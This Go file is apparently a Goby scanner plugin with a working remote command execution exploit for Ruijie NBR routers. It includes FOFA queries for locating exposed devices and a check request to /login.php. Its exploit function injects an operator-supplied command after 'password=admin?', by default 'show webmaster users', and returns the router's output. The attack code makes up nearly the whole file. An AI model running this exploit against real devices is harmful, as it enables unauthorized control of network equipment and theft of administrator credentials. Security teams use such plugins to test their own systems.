package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ruijie NBR Router RCE",
    "Description": "Ruijie Ruiyi smart series routers are suitable for export of small and micro enterprises. Equipped with high-performance hardware architecture, the device has many functions such as accurate flow control, online behavior management, VPN, multi Wan access, user authentication, etc. With its rich functions, Ruijie Ruiyi smart series routers can effectively optimize the user network, regulate the Internet behavior, help enterprises to carry out business in an all-round way, and improve the use experience of business system.",
    "Product": "Ruijie-NBR-Router",
    "Homepage": "http://www.ruijiery.com/cp/wg/",
    "DisclosureDate": "2021-03-23",
    "Author": "atdpa4sw0rd@gmail.com",
    "FofaQuery": "(app=\"Ruijie-NBR-Router\" || app=\"Ruijie-NBR router\") || (app=\"Ruijie-EG\" || app=\"RUIJIE-EG easy gateway\") || (app=\"Ruijie--EWEB\" || app=\"RUIJIE-EWEB network management system\")",
    "GobyQuery": "(app=\"Ruijie-NBR-Router\" || app=\"Ruijie-NBR router\") || (app=\"Ruijie-EG\" || app=\"RUIJIE-EG easy gateway\") || (app=\"Ruijie--EWEB\" || app=\"RUIJIE-EWEB network management system\")",
    "Level": "3",
    "Impact": "This issue affects devices exposed Internet",
    "Recommendation": "Disallow allowing Internet access to the device",
    "References": null,
    "RealReferences": null,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "show webmaster users"
        }
    ],
    "ExpTips": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "WORD",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "show",
                        "bz": ""
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": null,
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "Ruijie-NBR-Router"
        ]
    },
    "Disable": false,
    "PocId": "10174"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/login.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = "username=admin&password=admin?help"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "show pr")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/login.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = fmt.Sprintf("username=admin&password=admin?%s", cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				userinfo := resp.Utf8Html[25 : len(resp.Utf8Html)-13]
				expResult.Output = strings.Replace(userinfo, "\\r\\r\\n", "\n", -1)
				expResult.Success = true
			}
			return expResult
		},
	))
}

//   "FofaQuery": "app=\"Ruijie-NBR-Router\" || app=\"Ruijie-EG\" || app=\"Ruijie--EWEB\" || icon_hash=\"-692947551\"",
